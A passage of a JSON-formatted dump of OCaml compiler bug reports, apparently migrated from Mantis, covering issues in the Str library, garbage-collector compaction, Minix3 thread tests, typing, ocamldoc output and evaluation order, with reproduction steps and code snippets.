\\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*=\\\\( \\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*.*\"\r\n# Str.regexp x;;\r\nException: Invalid_argument \"index out of bounds\".\n\n## Additional information\n\nThe backtrace is not very useful, just pointing to recursive invocations of emit_code:\r\n\r\nRaised by primitive operation at file \"str.ml\", line 254, characters 4-49\r\nCalled from file \"str.ml\", line 385, characters 6-17\r\nCalled from file \"str.ml\", line 344, characters 6-17\r\nCalled from file \"str.ml\", line 413, characters 6-17\r\nCalled from file \"str.ml\", line 422, characters 2-14\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7368\n**Reporter:** amharc\n**Status:** closed (set by @damiendoligez on 2016-09-28T09:28:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** runtime system and C interface\n**Monitored by:** braibant @gasche\n\n## Bug description\n\nWhen the programmer triggers the major collection manually using either Gc.major () or Gc.full_major (), the decision whether to compact the heap or not is based on a heuristic separate from the usual one. In particular, it does not compact the heap if it consists only of a single chunk. This was fine when the first chunk was never deallocated, but this has no longer been true since #5389: After a heap recompaction occurs, the heap consists of a single chunk, which can be arbitrarily large. If the programmer keeps triggering garbage collection manually, this chunk will not be compacted even if the live set size is small.\r\n\r\nThe attached program exhibits this behaviour: even though the live set is ca. 8 MB, the heap size is kept at ca. 14 GB.\n\n## Steps to reproduce\n\nopam switch 4.03.0\r\neval `opam config env`\r\nocamlopt test.ml -o test\r\n./test\n\n## File attachments\n\n- [7368-test.ml](https://gist.githubusercontent.com/vicuna/e221e7f9161af0f3c133fecc5a6d96b2/raw/495b53e832f805311f58b69d4737ab062525adc6/7368-test.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7367\n**Reporter:** pmetras\n**Status:** resolved (set by @xavierleroy on 2017-02-16T08:11:09Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** i386\n**OS:** Minix3\n**OS Version:** 3.4.0\n**Category:** standard library\n**Monitored by:** @gasche\n\n## Bug description\n\nFor test testsuite/tests/lib-threads/pr5325.ml, the problem occurs with the call \"Unix.shutdown s Unix.SHUTDOWN_SEND\". I was unable to issue a shutdown command on Minix3 from OCaml. I've read the code multiple times and I don't understand why it does not work. Calling shutdown() from C code is working correctly, according to /usr/tests/minix-posix/test56 from Minix3 test suite.\r\n\r\nThe compilation command used by the test is \"../byterun/ocamlrun ../ocamlc -g -nostdlib -I ../stdlib -w a -vmthread -I ../otherlibs/threads -I ../otherlibs/unix unix.cma threads.cma tests/lib-threads/pr5325.ml -o program\"\r\n\r\nIt raises a Unix.Unix_error when run with \"../byterun/ocamlrun -b ./program\"\r\nFatal error: exception Unix.Unix_error(2, \"shutdown\", \"\")\r\nRaised by primitive operation at unknown location (inlined)\r\nCalled from file \"pr5325.ml\", line 63, characters 2-31\r\n\r\nIf the call to Unix.shutdown is removed, the test succeeds, but that's not game.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7366\n**Reporter:** pmetras\n**Status:** resolved (set by @xavierleroy on 2017-02-16T08:53:43Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** i386\n**OS:** Minix3\n**OS Version:** 3.4.0\n**Category:** otherlibs\n**Monitored by:** @gasche\n\n## Bug description\n\nThe testsuite fails for some tests in lib-threads but I was unable to find the reason. This is related to the generated byte code. For instance, the test testsuite/tests/lib-threads/socketsbuf.ml fails, when executed with the just generated from sources OCaml version. But it passes if the same OCaml version is installed in /usr/local! The same bug occurs for testsuite/tests/lib-threads/fileio.ml.\r\n\r\n$ ../byterun/ocamlrun -b -I ../stdlib -I ../otherlibs/threads -I ../otherlibs/unix ./program\r\nThread 2 killed on uncaught exception Sys_blocked_io\r\nRaised by primitive operation at file \"pervasives.ml\", line 415, characters 4-749\r\nCalled from file \"socketsbuf.ml\", line 26, characters 10-23\r\nCalled from file \"thread.ml\", line 131, characters 8-14\r\nFatal error: exception Sys_blocked_io\r\nRaised by primitive operation at file \"pervasives.ml\", line 415, characters 4-749\r\nCalled from file \"socketsbuf.ml\", line 26, characters 10-23\r\nCalled from file \"socketsbuf.ml\", line 46, characters 2-30\r\n\r\nFor people interested in system debugging, the exception occurs in byterun/unix.c, in function caml_read_fd.\r\n\r\nThe problem is in the generated code and the location of stdlib.\n\n## Steps to reproduce\n\nTo reproduce the bug it:\r\n1. Compile the full OCaml distribution\r\n2. Run the test socketsbuf.ml from the testsuite: it fails...\r\n3. Compile it with \"../byterun/ocamlrun ../ocamlc -g -I ../stdlib -w a -vmthread -I ../otherlibs/threads -I ../otherlibs/unix unix.cma threads.cma tests/lib-threads/socketsbuf.ml -o program\". The testsuite version uses \"-nostdlib -I ../testsuite/lib\" parameters that does not affect the result and that we removed.\r\n4. Run it with \"../byterun/ocamlrun -b -I ../stdlib -I ../otherlibs/threads -I ../otherlibs/unix ./program\". It fails again...\r\n5. Become root and install the Ocaml distribution\r\n6. Run again the program, but now you don't need all the includes as you use the system OCaml: \"./program\". It still fails...\r\n7. Compile it with the system ocaml compiler: \"ocamlc -g -w a -vmthread unix.cma threads.cma socketsbuf.ml -o program\"\r\n8. Run it: \"./program\". IT WORKS!\r\n9. Delete the system OCaml installation in /usr/local.\r\n10. Check you've done the job correctly: \"./program\" should print \"./program: not found\".\r\n11. Run it again with \"../byterun/ocamlrun -b -I ../stdlib -I ../otherlibs/threads -I ../otherlibs/unix ./program\". IT STILL WORKS NOW!!!\r\n\r\nYou can see that the good and the bad programs have different sizes but I haven't seen an option to extract the generated bytecode and find the differences.\r\n\r\nWhen the OCaml distribution is installed on the system, the shortest way to see the bug is:\r\n1. Program generated by \"ocamlc -g -w a -vmthread -I ../stdlib/ unix.cma threads.cma socketsbuf.ml -o program\" fails\r\n2. Program generated by \"ocamlc -g -w a -vmthread unix.cma threads.cma socketsbuf.ml -o program\" executes successfully\n\n## Additional information\n\nMinix3 does not have system threads and I've adapted the testsuite to use VM threads instead.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7364\r\n**Reporter:** @gasche\r\n**Assigned to:** @damiendoligez\r\n**Status:** assigned (set by @mshinwell on 2016-12-07T16:54:05Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Category:** typing\r\n**Has duplicate:** #7532 #7774\r\n**Monitored by:** sweeks @yallop\r\n\r\n## Bug description\r\n\r\nMarkus Mottl remarked that unboxed types safeguards against floating points are not computed precisely enough in the case of mutually recursive type declarations:\r\n\r\n  https://github.com/ocaml/ocaml/pull/606#issuecomment-248656482\r\n\r\nHis example is natural, it suggests that fixing this limitation before the release could be very beneficial.\r\n\r\n## Steps to reproduce\r\n\r\n```\r\ntype ('a, 'kind) tree =\r\n  | Root : { mutable value : 'a; mutable rank : int } -> ('a, [ `root ]) tree\r\n  | Inner : { mutable parent : 'a node } -> ('a, [ `inner ]) tree\r\n\r\nand 'a node = Node : ('a, _) tree -> 'a node  [@@ocaml.unboxed]\r\n\r\ntype 'a t = ('a, [ `inner ]) tree\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7362\n**Reporter:** @dbuenzli\n**Status:** closed (set by @damiendoligez on 2016-10-25T15:03:26Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Monitored by:** @gasche @hcarty @dbuenzli\n\n## Bug description\n\nIn the opkg project we automatically generate cross-linked API documentation for installed packages. The way packages are supposed to indicate what should be present in the generated API documentation is by installing mli and cmi (for ocamldoc generation) and cmti (for odoc generation) files for the modules that constitutes your API and you would like to see documented (more control through the package meta-data file may be provided in the future though). \r\n\r\nWhile the ocamldoc path renders ocaml's package quite well with this convention (see http://docs.mirage.io/ocaml/index.html). It fails quite badly on the odoc path (see http://docs.mirage.io/odoc/ocaml/index.html). \r\n\r\nThere are two reasons.  \r\n\r\n1. A lot of cmti files are installed for modules that are not part of the public API (at least their mli is not installed); those are mainly files in the compiler-libs/ directory. \r\n\r\n2. It seems that the cmti files for otherlibs are not installed, e.g. bigarray.cmti, str.cmti, unix.cmti, etc. are all missing.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7361\n**Reporter:** @bobzhang\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-10-10T09:33:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** compiler driver\n**Related to:** #6714\n**Monitored by:** @gasche\n\n## Bug description\n\n``` a.ml\r\n[@@@ocaml.warning \"-22\"]\r\n\r\nlet a = 3\r\n[@@ocaml.ppwarning \"hey\"]\r\n```\r\nocamlc.opt -c  a.ml // print warning which should not\r\nocamlc.opt -w -22 -c a.ml // good\n"},{"labels":["bug",null,null,null],"text":"**Original bug ID:** 7360\n**Reporter:** rlepigre\n**Status:** resolved (set by @damiendoligez on 2016-09-28T12:18:15Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** typing\n**Duplicate of:** #7028\n**Related to:** #5985\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nA GADT which uses abstract types (or phantom types defined in another module) leads to problems with pattern matching exhaustiveness checking. See the examples.\n\n## Steps to reproduce\n\nJust call \"ocaml\" on the example files.\n\n## File attachments\n\n- [phantom.tar](https://gist.githubusercontent.com/vicuna/b75c41fa9ef97a02c3e01e34e61dd8df/raw/7738a0c03628bcef10cfa4c3567192b54007fe8d/phantom.tar)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7359\n**Reporter:** sebmondet\n**Assigned to:** @garrigue\n**Status:** assigned (set by @xavierleroy on 2017-02-18T11:16:25Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nThis happened in big libraries and was difficult to spot (https://github.com/hammerlab/{ketrew,biokepi,epidisco}).\r\nI have extracted the reproduction of the bug to 3 files that do not have dependencies:\r\n\r\nhttps://gitlab.com/smondet/repro_ocaml_pack_problem\r\n\r\nThe reproduction there uses OCaml 4.02.3.\r\n\r\nWith 4.03.0, this seems partially fixed (?), at least in the same case we get an error but the error message still points at the wrong field:\r\n\r\n $ File \"mod_c.ml\", line 5, characters 2-27:\r\nError: This expression has type Mod_a.product Lib_a.Mod_a.Container.t\r\n       It has no method product\r\nHint: Did you mean product?\r\n\r\n(while the method that does not exist is `path`)\r\n\r\nNot sure if this exhibits a deeper issue, or if it has been really fixed in 4.03.0.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7358\n**Reporter:** @nojb\n**Status:** closed (set by @mshinwell on 2016-12-08T16:02:28Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Target version:** later\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nI just found out that the precedence level of user-defined operators (||~) and (&&~) is the *same*, and that they associate to the left.  On the other hand, (||) and (&&) have different precedences and associate to the right (see\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml/expr.html).\r\n\r\nI understand the need to have user defined operators |... and &... associate to the left given the ubiquity of composition operators such as (|>). But I wonder what is the rationale of them having the same precedence, which is confusing in the case of (||~) and (&&~) (as it does not coincide with that of || and &&).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7357\n**Reporter:** @bobzhang\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2016-12-21T13:40:29Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** middle end (typedtree to clambda)\n**Tags:** github\n\n## Bug description\n\npreviously I have one big file `whole_compiler.ml` and a dummy `whole_compiler.mli`, now I changed the implementation of `whole_compiler.ml` to get rid of the dummy interface as below:\r\n\r\ninclude (struct\r\n(* nothing changed for the old code *)\r\nend : sig end)\r\n\r\nThe compilation time doubled from 19s to 38s for native backend. (4.02.3)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7355\n**Reporter:** @yallop\n**Status:** closed (set by @damiendoligez on 2016-09-28T11:46:40Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Monitored by:** braibant @dbuenzli\n\n## Bug description\n\nThe Gc module documentation says\r\n\r\n   Note that values of types [float] and ['a lazy] (for any ['a]) are\r\n   sometimes allocated and sometimes not, so finalising them is unsafe,\r\n   and [finalise] will also raise [Invalid_argument] for them.\r\n\r\n   https://github.com/ocaml/ocaml/blob/5c4c41ba/stdlib/gc.mli#L296-L298\r\n\r\nHowever, passing a lazy value to Gc.finalise does not always raise an exception:\r\n\r\n   # Gc.finalise ignore (lazy ignore);;\r\n   - : unit = ()\r\n\r\n[There's also a second small bug above: the documentation has \"'a lazy\" where it should have \"'a Lazy.t\"]\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7354\n**Reporter:** shayne_fletcher\n**Status:** resolved (set by @damiendoligez on 2016-09-28T09:49:06Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Platform:** windows\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** configure and build/install\n\n## Bug description\n\nWhen building 4.0.3 including a bootstrap of flexdll, I'm experiencing build failures (of `flexlink.exe`) at the `make -f Makefile.nt opt.opt` (relating to processing of \"version.res\").\r\n\r\n```\r\ncd flexdll && \\\r\nmv flexlink.exe flexlink && \\\r\nmake OCAML_FLEXLINK=\"../boot/ocamlrun ./flexlink\" MSVC_DETECT=0 \\\r\n           TOOLCHAIN=msvc TOOLPREF= \\\r\n           OCAMLOPT=\"../ocamlopt.opt -I ../stdlib\" flexlink.exe && \\\r\nmv flexlink.exe flexlink.opt && \\\r\nmv flexlink flexlink.exe\r\nmake[1]: Entering directory '/cygdrive/c/project/others/ocaml-4.03.0/flexdll'\r\nBuilding flexlink.exe with TOOLCHAIN=msvc for OCaml 4030\r\nrm -f flexlink.exe\r\n../ocamlopt.opt -I ../stdlib -o flexlink.exe -cclib \"version.res\" version.ml Compat.ml coff.ml cmdline.ml create_dll.ml reloc.ml\r\n** Fatal error: Error while reading version.res: End_of_file\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\nMakefile:133: recipe for target 'flexlink.exe' failed\r\nmake[1]: *** [flexlink.exe] Error 2\r\nmake[1]: Leaving directory '/cygdrive/c/project/others/ocaml-4.03.0/flexdll'\r\nMakefile.nt:65: recipe for target 'flexlink.opt' failed\r\nmake: *** [flexlink.opt] Error 2\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7353\n**Reporter:** @dbuenzli\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-03-15T22:12:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\nHere's an example: \r\n\r\nThe text \"Besides ...\" that follows the first code fence of this section: \r\n\r\nhttp://erratique.ch/tmp/opkg-ocamldoc/var/cache/opkg/ocamldoc/react/React.html#lifting\r\n\r\nIs not wrapped into a p as would be expected. Here's the code: \r\n\r\nhttps://github.com/dbuenzli/react/blob/master/src/react.mli#L949-L957\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7352\n**Reporter:** @dbuenzli\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-03-15T22:08:39Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\nThey sometimes introduce unwanted whitespace in the rendered output and makes it difficult to design a consistent stylesheet (you randomly get either too much whitespace or too little). Using a p:empty rule to hide them is impossible since they do actually have content in it. \r\n\r\nHere are a few examples of this.\r\n\r\nBefore this h2: \r\nhttp://erratique.ch/tmp/opkg-ocamldoc/var/cache/opkg/ocamldoc/astring/Astring.html#porttrim\r\nSource: \r\nhttps://github.com/dbuenzli/astring/blob/master/src/astring.mli#L1225\r\n\r\nBefore this h1:\r\nhttp://erratique.ch/tmp/opkg-ocamldoc/var/cache/opkg/ocamldoc/astring/Astring.html#port\r\nSource:\r\nhttps://github.com/dbuenzli/astring/blob/master/src/astring.mli#L1198\r\n\r\nBefore and after this h1: \r\nhttp://erratique.ch/tmp/opkg-ocamldoc/var/cache/opkg/ocamldoc/react/React.html#basics\r\nSource:\r\nhttps://github.com/dbuenzli/react/blob/master/src/react.mli#L821\r\n\r\nIt seems that it's before header introductions but I wouldn't swear I didn't see this in other places.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7351\n**Reporter:** @dbuenzli\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-03-15T22:06:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\nThey prevent using CSS to its full extent to style the documentation. For example here's what I have in my style sheet. \r\n\r\nbr { display: none } /* Annoying, hide them. */\r\ncode br { display: block } /* Except in signatures. */\r\n\r\nThe presence of br in the output disallows me to use e + e' CSS rules. A particular instance of this in my stylesheet is: \r\n\r\nhr\r\n{ display: none } /* Would be nice to have but we cannot get that to\r\n                     interact well with our h1's because of br markup noise */\r\n\r\nI'd like to specify something for hr + h1 but I'm unable since the output has the sequence hr br h1\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7349\n**Reporter:** zozozo\n**Status:** closed (set by @mshinwell on 2017-03-07T13:22:52Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** middle end (typedtree to clambda)\n**Duplicate of:** #3922\n**Related to:** #7645\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nA fatal error appears when trying to build a binary in the msat project (https://github.com/Gbury/mSAT). The fatal error only appears with the flambda switch.\n\n## Steps to reproduce\n\n# Clone the repo and checkout the relevant commit\r\ngit clone https://github.com/Gbury/mSAT.git\r\ngit checkout 954892ac4aa9130e77915429e7f5e492c9697a4b\r\n\r\n# Switch to 4.03.0+Flambda and install dependencies\r\nopam switch 4.03.0+flambda\r\nopam install ocamlfind ocamlbuild dolmen\r\n\r\n# Try and build the project\r\nmake bin\n\n## Additional information\n\nEven without the fatal error, the build produces some warnings, and does not finish, but the fatal error is not very informative about what the problem is and how to fix it.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7348\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-06-12T14:31:33Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Monitored by:** @gasche @yallop @hcarty\n\n## Bug description\n\nThe following functor:\r\n\r\n  module F (X : sig type t = private < foo:int; ..> val x : t end) = struct\r\n    let x : < foo: int; ..> = X.x\r\n  end\r\n\r\nhas a return type that includes the private row variable from X:\r\n    \r\n  module F :\r\n    functor (X : sig type t = private < foo : int; .. > val x : t end) ->\r\n      sig val x : < foo : int; .. > end\r\n\r\nThis variable remains abstract even when the functor is applied:\r\n\r\n  module M = struct\r\n      type t = < foo: int; bar: int>\r\n      let x = object\r\n        method foo = 0\r\n        method bar = 0\r\n      end\r\n   end\r\n\r\n  module N = F(M)\r\n\r\nwhich has type:\r\n\r\n  module N : sig val x : < foo : int; .. > end\r\n\r\nTo see that the variable is still abstract:\r\n\r\n # module L : sig val x : < foo : int; bar : int> end = N;;\r\n\r\n  Characters 53-54:\r\n    module L : sig val x : < foo : int; bar : int> end = N;;\r\n                                                         ^\r\n  Error: Signature mismatch:\r\n         Modules do not match:\r\n           sig val x : < foo : int; .. > end\r\n         is not included in\r\n           sig val x : < bar : int; foo : int > end\r\n         Values do not match:\r\n           val x : < foo : int; .. >\r\n         is not included in\r\n           val x : < bar : int; foo : int >\r\n\r\n  # let x : < foo : int; bar : int> = N.x;;\r\n  Characters 34-37:\r\n    let x : < foo : int; bar : int> = N.x;;\r\n                                      ^^^\r\n  Error: This expression has type < foo : int; .. >\r\n         but an expression was expected of type < bar : int; foo : int >\r\n         The first object type has no method bar\r\n\r\nI suspect that the type is called something like X.t#row and is being substituted to M.t#row which does not exist. This could possibly be\r\na soundness bug since different functors would produce the same\r\nM.t#row even though they would be different types.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7347\n**Reporter:** sebmondet\n**Status:** resolved (set by @xavierleroy on 2017-02-18T15:13:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Child of:** #6081\n\n## Bug description\n\nSince 4.03.0, the `#use` directive seems to treat \"file.ml\" and \"./file.ml\" differently:\r\n\r\n- the \"file.ml\" one seems to be relative to the script.\r\n- the \"./file.ml\" one seems to be relative to the current-directory of the `ocaml` process.\r\n\r\n(Doesn't seem to be in the changelog: https://github.com/ocaml/ocaml/blob/bf6261c2b7058a2ac2c471839d48acb1c77c22fd/Changes#L841)\n\n## Steps to reproduce\n\nexample/ex.ml:\r\n```\r\n#use \"same_dir.ml\"\r\n\r\n#use \"./dot_slash.ml\"\r\n\r\n\r\nlet () = Printf.printf \"%s, %s\\n%!\" Same_dir.(hello ()) Dot_slash.(hello ())\r\n```\r\n\r\nexample/same_dir.ml\r\n```\r\nmodule Same_dir = struct let hello () = \"same-dir\" end\r\n```\r\n\r\nexample/dot_slash.ml:\r\n```\r\nmodule Dot_slash = struct let hello () = \"dot-slash\" end\r\n```\r\n\r\n\r\n### With 4.02.0\r\n\r\n $ ocaml -version\r\nThe OCaml toplevel, version 4.02.3\r\n $ ocaml example/ex.ml \r\nCannot find file same_dir.ml.\r\nCannot find file ./dot_slash.ml.\r\nFile \"example/ex.ml\", line 7, characters 36-44:\r\nError: Unbound module Same_dir\r\n $ cd example/ ; ocaml ex.ml\r\nsame-dir, dot-slash\r\n\r\n### With 4.03.0\r\n\r\nIt finds `same_dir.ml`.\r\n\r\n $ ocaml -version\r\nThe OCaml toplevel, version 4.03.0\r\n $ ocaml example/ex.ml \r\nCannot find file ./dot_slash.ml.\r\nFile \"./example/ex.ml\", line 7, characters 56-65:\r\nError: Unbound module Dot_slash\r\n $ cd example/ ; ocaml ex.ml\r\nsame-dir, dot-slash\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7346\r\n**Reporter:** @damiendoligez\r\n**Assigned to:** @mshinwell\r\n**Status:** closed (set by @mshinwell on 2016-12-13T10:22:18Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** major\r\n**Version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** middle end (typedtree to clambda)\r\n**Related to:** #4072 #6136\r\n**Monitored by:** @gasche @yallop @hcarty\r\n\r\n## Bug description\r\n\r\nWith ocamlopt, the order of evaluation of function arguments depends on the code generated for the argument after inlining.\r\n\r\nWith ocamlc and ocamlopt+flambda, the order is always the same.\r\n\r\n## Steps to reproduce\r\n\r\nTry this with ocamlc and ocamlopt:\r\n```ocaml\r\nlet get r = !r [@@inline never]\r\n\r\nlet i = ref 0\r\nlet incr_i () = incr i; !i\r\n\r\nlet f (x, y) = Printf.printf \"%d %d\\n\" x y [@@inline never]\r\nlet _ = f (incr_i (), get i)\r\n\r\nlet g x y = Printf.printf \"%d %d\\n\" x y [@@inline never]\r\nlet () = g (incr_i ()) (get i)\r\n```\r\n\r\nThey give the same result, all is well.\r\nRemove the [@@inline never] annotation on the first line and they give different results.\r\nNow make the function more complex (let get r = !r + (let rec f x = if x < 1 then 0 else 1 + f (x-1) in f 0)) and the result changes again.\r\n"},{"labels":[null,null,"bug"],"text":"**Original bug ID:** 7345\r\n**Reporter:** @mshinwell\r\n**Status:** acknowledged (set by @mshinwell on 2016-09-08T11:07:36Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Target version:** later\r\n**Category:** back end (clambda to assembly)\r\n**Related to:** #7384\r\n**Monitored by:** @hcarty\r\n\r\n## Bug description\r\n\r\nIt looks like let bindings introduced to alias function parameters holding constructed values of inline record type cause debugging events to be inserted that subsequently cause closure allocation.  The allocations happen because the code for combining closures in Simplif (see simplif.ml:464) won't apply owing to the intervening events.\r\n\r\nThis doesn't happen from 4.04 onwards with native code after the changes to remove debugging events in that context.  It still happens with bytecode, however.\r\n\r\nFor the example below:\r\n```\r\n     f/1207 =\r\n       (function param/1281\r\n         (funct-body inline_allocation.ml(10)<ghost>:130-153\r\n           (let (a/1209 =a param/1281)   (* this let causes the problem *)\r\n             (before inline_allocation.ml(10)<ghost>:136-153\r\n               (function z/1210\r\n                 (funct-body inline_allocation.ml(10)<ghost>:136-153\r\n                   (before inline_allocation.ml(11):142-153\r\n                     (after inline_allocation.ml(11):142-153\r\n                       (apply equal/1204 (field 0 a/1209) z/1210)))))))))\r\n```\r\n## Steps to reproduce\r\n\r\nCompile and run the following using ocamlc (not ocamlopt).\r\nThe answer should be zero, but it prints four.\r\n```ocaml\r\ntype _ t = \r\n  | A : { x : int } -> [`A] t\r\n  | B : [`B] t\r\n\r\nlet _unused_constr = B \r\n\r\nlet equal (x : int) (y : int) =\r\n  x = y\r\n\r\nlet f (A a) z =\r\n  equal a.x z\r\n\r\nlet t = A { x = 5 } \r\n\r\nlet () =\r\n  let start = Gc.minor_words () in\r\n  let (_res : bool) = f t 3 in\r\n  let stop = Gc.minor_words () in\r\n  Printf.printf \"%f\\n\" (stop -. start -. 2.)\r\n```\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7344\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-15T01:56:44Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Related to:** #7389\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe following code does not type-check:\r\n\r\n  # let rec f : unit -> < m: 'a. 'a -> 'a> =\r\n      fun () ->\r\n        let x = f () in\r\n        ignore (x#m 1);\r\n        ignore (x#m \"hello\");\r\n        assert false;;\r\n  Characters 117-124:\r\n        ignore (x#m \"hello\");\r\n                    ^^^^^^^\r\n  Error: This expression has type string but an expression was expected of type\r\n         int\r\n\r\nbut it does if you add parentheses:\r\n\r\n  # let rec (f : unit -> < m: 'a. 'a -> 'a>) =\r\n      fun () ->\r\n        let x = f () in\r\n        ignore (x#m 1);\r\n        ignore (x#m \"hello\");\r\n        assert false;;\r\n  val f : unit -> < m : 'a. 'a -> 'a > = <fun>\r\n\r\nor if you add an unused polymorphic variable:\r\n\r\n  # let rec f : 'b. unit -> < m: 'a. 'a -> 'a> =\r\n      fun () ->\r\n        let x = f () in\r\n        ignore (x#m 1);\r\n        ignore (x#m \"hello\");\r\n        assert false;;\r\n  val f : unit -> < m : 'a. 'a -> 'a > = <fun>\r\n\r\nor if you turn on `-principal`:\r\n\r\n  # #principal true;;\r\n  # let rec f : unit -> < m: 'a. 'a -> 'a> =\r\n      fun () ->\r\n        let x = f () in\r\n        ignore (x#m 1);\r\n        ignore (x#m \"hello\");\r\n        assert false;;\r\n  val f : unit -> < m : 'a. 'a -> 'a > = <fun>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7343\n**Reporter:** berenger\n**Status:** resolved (set by @xavierleroy on 2017-02-18T15:49:51Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n\n## Bug description\n\nHello,\r\n\r\nLet's say someone must implement another map, that must expose the same interface and behavior than the map of the stdlib.\r\n\r\nWhat is the precise semantics of this f function ?\r\n\r\nIn: Map.union f m1 m2\r\n\r\nwhat should implementers do in case (f v1 v2) returns None ?\r\n\r\nShould the key k (bound to v1 in m1 and v2 in m2) be dropped ?\r\nThen, the output map would not hold a union of 